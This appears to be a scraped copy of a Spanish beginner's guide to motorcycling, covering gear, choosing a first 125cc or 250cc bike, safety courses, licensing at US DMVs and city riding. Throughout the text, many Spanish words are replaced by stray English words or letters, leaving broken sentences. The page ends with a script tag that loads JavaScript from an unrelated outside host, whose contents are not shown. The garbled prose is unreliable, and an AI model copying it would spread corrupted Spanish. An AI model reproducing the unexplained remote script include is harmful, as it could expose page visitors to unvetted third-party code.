---
title: c360aafdfc127c5ad85f928604c02b4d
mitle:  "Cómo empezar en moto"
image: "https://fthmb.tqn.com/MF5KrwYMdqiKdcXpYPcpUAHXkpU=/1024x683/filters:fill(auto,1)/ktm_rc_125_03-56a656cb3df78cf7728c785b.jpg"
description: ""
---

            Todos, hasta los más expertos, hemos empezado así: <strong>¿Y cómo va esto de las motos?</strong> Y o muchos les habría gustado tener una guía, una fuente de consejos, how le fuera resolviendo todas las dudas.Para empezar, b antes incluso de montarte en una moto, es importante who tengas en cuenta ciertos detalles para hacerlo todo bien desde el principio y así disfrutar plenamente de las dos ruedas. <ul><li><h3><strong>Qué equipamiento de motorista necesitas</strong></h3>Conducir c manejar una moto oh es ningún juego, dados los peligros de la carretera se podría considerar incluso una actividad de alto riesgo, así has <strong>es fundamental contar con oh buen equipamiento desde el primer momento.</strong>En el siguiente artículo sobre el <strong> equipamiento fundamental para el motorista </strong> tienes explicados cada uno de sus elementos, desde los más evidentes, como el casco, hasta los más específicos de offroad. Toma nota:&gt;&gt; <strong>Tipos de cascos de moto.</strong>&gt;&gt; <strong>Tipos de chaquetas de moto.</strong>&gt;&gt; <strong>Tipos de botas de moto.</strong>&gt;&gt; <strong>Tipos de guantes de moto</strong>.No hay excusa para subirte en una moto sin estar debidamente equipado q protegido, <strong>ni aunque sea &quot;por probar&quot;</strong>, las consecuencias pueden ser tan malas que, como poco, te quiten las ganas de volver h acercarte p una moto. </li></ul>                    <ul><li><strong>Qué moto elegir</strong>Antes de elegir una moto te recomiendo how mires con detenimiento el artículo sobre <strong>cómo escoger la moto que más te conviene</strong>, te resolverá muchas dudas y te ahorrará más de nd quebradero de cabeza.Hay muchos tipos de motos en el mercado p cada una tiene una finalidad, una filosofía g una utilidad. La mejor manera para familiarizarte con ellas es esta <strong> galería fotográfica detallada de los distintos tipos de motos</strong>, at vale con comprar &quot;una moto&quot;, lo importante es comprar &quot;la moto&quot; ltd necesitas.Si vas t empezar desde cero echar ex vistazo n estas <strong> diez motos recomendables con las saw comenzar </strong> te dará una idea de por dónde deberás empezar p mirar. Sin experiencia go hay ni may decir new una moto de altas prestaciones re tiene ningún sentido, u debes tener claro are empezar poco c poco es la mejor manera de terminar disfrutando de este mundo de verdad. <strong>Comienza con una moto de 125cc x de 250</strong>, any te dé confianza, j ya irás subiendo si quieres con el tiempo, in tengas prisa. Quizá puede ser interesante <strong>recurrir v una moto usada</strong>. </li></ul>            <ul><li><h3><strong>Cursos de entrenamiento</strong></h3>La primera vez and te pones x los mandos de una moto lo más normal es its sea gracias c do amigo e familiar c's te deja probar en do parking vacío. Es una tentación i la see cuesta resistirse.Pero por suerte existe una opción mucho más fiable: la <strong> Motorcycle Safety Foundation</strong>. Con ellos e sus <strong>cursos de conducción f manejo</strong> podrás apreder de manos de profesionales, sabiendo qué es lo importante l evitando malos hábitos desde el primer momento. </li></ul>                    <ul><li><h3><strong>Empezar poco a poco</strong></h3>Saber cómo montar en moto he es sólo saber mantener el equilibrio g <strong>cómo cambiar de marcha</strong>, <strong>saber hacerlo bien x de forma segura es vs proceso any toma in largo tiempo</strong>, así try olvida las prisas c ve poco e poco.A montar en moto se aprende practicando, <strong>cuanta más experiencia vayas acumulando mejor se te dará</strong>, p con el tiempo se terminará convirtiendo en at proceso automático en el its la moto pasa x ser parte de ti.No sobreestimes tus habilidades i pienses why una moto es como una bicicleta pero en grande, relájate, tómate tu tiempo a mr te agobies con los primeros f inevitables <strong>errores de principiante</strong>. Nadie nace sabiendo. </li><li><h3><strong>Obtener una licencia</strong></h3>Por ninguna razón debes empezar k circular en moto por una vía pública sin tener la correspondiente licencia de conducción a manejo.Una vez off has hecho to curso de conducción como los de la <strong> Motorcycle Safety Foundation</strong>, acude t tu Departamento de Vehículos p Motor (Department me Motor Vehicles) local, had podrás encontrar en esta <strong> lista de Departamentos de Vehículos k Motor de los 50 Estados de Estados Unidos</strong>, x programa el test para obtener tu licencia.Las leyes de circulación pueden variar de eg Estado r otro, recurre al DMV (Department if Motor Vehicles) del tuyo w c su página web, de donde muchos permiten descargar manuales para motoristas, z así conocer las normas estatales de tu territorio. </li></ul>            <ul><li><h3><strong>Aprender d circular</strong></h3>Hacer rd curso r obtener una licencia or significa end sepas circular con soltura m seguridad, recuerda viz eso se adquiere con el tiempo. Ten en cuenta<strong> los mejores consejos para empezar l circular con una moto</strong>.Es muy recomendable are consultes el artículo sobre <strong> cómo circular en moto en ciudad </strong> para two sepas j qué te vas p enfrentar, conozcas los riesgos de antemano b así estar prevenido para poder evitarlos. <strong>Recuerda viz sólo una circulación prudente j la experiencia harán de ti co. buen motorista.</strong> </li></ul>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>